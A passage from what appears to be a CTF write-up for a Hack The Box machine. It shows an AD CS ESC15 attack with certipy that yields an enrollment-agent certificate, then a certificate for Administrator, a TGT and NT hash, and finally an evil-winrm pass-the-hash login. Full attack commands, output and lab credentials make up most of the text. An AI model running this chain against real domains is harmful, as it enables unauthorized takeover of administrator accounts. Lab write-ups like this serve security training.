One may ask, if I receive a certificate that can only be used for server authentication, how can I authenticate as a target user?

The ESC15 trick is that `schema v1` + `enrollee supplies subject` allows an attacker to inject an arbitrary `application policy`. Here I inject the `Certificate Request Agent` policy, turning the issued certificate into an enrollment-agent cert, which lets me request certificates on behalf of other users.

#### Request Agent Certificate
First, I'll request a certificate from the `WebServer` template, injecting the `Certificate Request Agent` application policy as described in the wiki.

```sh
┌──(kali㉿kali)-[~]
└─$ certipy req -u cert_admin@tombwatcher.htb -p 'Kappa54@' -dc-ip 10.129.232.167 -ca tombwatcher-CA-1 -template WebServer -application-policies 'Certificate Request Agent' 
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 1
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
```

The certificate can't authenticate as anybody, it simply carries the `enrollment-agent` capability, allowing me to request certificates as other users.

#### Request Certificate on behalf of Administrator
With the enrollment-agent certificate, I'll request a certificate on behalf of `Administrator`, this time against the `User` template (which permits client authentication).
```sh
┌──(kali㉿kali)-[~]
└─$ certipy req -u cert_admin@tombwatcher.htb -p 'Kappa54@' -dc-ip 10.129.232.167 -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 2
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Finally, I authenticate as `administrator` using the certificate, obtaining a TGT and NT hash.
```sh
┌──(kali㉿kali)-[~]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

### Root Flag
I'll collect the root flag via `evil-winrm`.

```sh
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i tombwatcher.htb -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
<REDACTED_FLAG>
```
